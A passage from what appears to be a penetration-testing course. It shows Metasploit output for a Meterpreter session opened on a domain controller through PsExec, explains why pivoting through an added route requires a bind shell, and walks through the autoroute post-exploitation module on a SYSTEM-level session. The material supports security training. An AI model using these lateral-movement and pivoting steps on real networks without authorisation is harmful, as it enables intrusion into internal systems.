![](bbox=[0.13, 0.04, 0.28, 0.1])

[*] Sending stage (180291 bytes) to 192.168.1.110
[*] Meterpreter session 5 opened (10.11.0.4:10-11.0.22:0 -> 192.168.1.110:444)

meterpreter >

# **Listing 807 - Using PsExec from Metasploit**

It’s important to note that the added route will only work with established connections. Because of this, the new shell on the domain controller must be a bind shell, thus allowing us to use the set route to connect to it. A reverse shell payload would not be able to find its way back to our attacking system because the domain controller does not have a route defined for our network. In this manner, we were able to obtain a meterpreter shell from the domain controller on the internal network we would otherwise not be able to reach directly.

As an alternative to adding routes manually, we can use the **autoroute** post-exploitation module, which can set up pivot routes through an existing meterpreter session automatically. Listing 808 demonstrates how the module is invoked.

```
msf5 exploit(multi/handler) > use multi/manage/autoroute

msf5 post(multi/manage/autoroute) > show options

Module options (post/multi/manage/autoroute):

| Name | Current Setting | Required | Description |
| --- | --- | --- | --- |
| CMD | autoadd | yes | Specify the autoroute command (Accepted: add, autorouteadd, print, delete, default) |
| NETMASK | 255.255.255.0 | no | Netmask (IPv4 as "255.255.255.0" or CIDR as "/24") |
| SESSION | yes | The session to run this module on. |
| SUBNET | no | Subnet (IPv4, for example, 10.10.10.0) |

msf5 post(multi/manage/autoroute) > sessions -l

Active sessions
================

| Id | Name | Type | Information | Connection |
| --- | --- | --- | --- | --- |
| 4 | meterpreter | x86/windows | NT AUTHORITY\SYSTEM @ WIN10-X86 | 10.11.0.4:5555 -> 10.11.0.22:1883 (10.11.0.22) |

msf5 post(multi/manage/autoroute) > set session 4
session => 4

msf5 post(multi/manage/autoroute) > exploit

[!] SESSION may not be compatible with this module.
[*] Running module against CLIENT251
[*] Searching for subnets to autoroute.
[*] Route added to subnet 192.168.1.0/255.255.255.0 from host’s routing table.
[*] Route added to subnet 10.11.0.0/255.255.255.0 from host’s routing table.
[*] Route added to subnet 169.254.0.0/255.255.0.0 from Fortinet virtual adapter.
```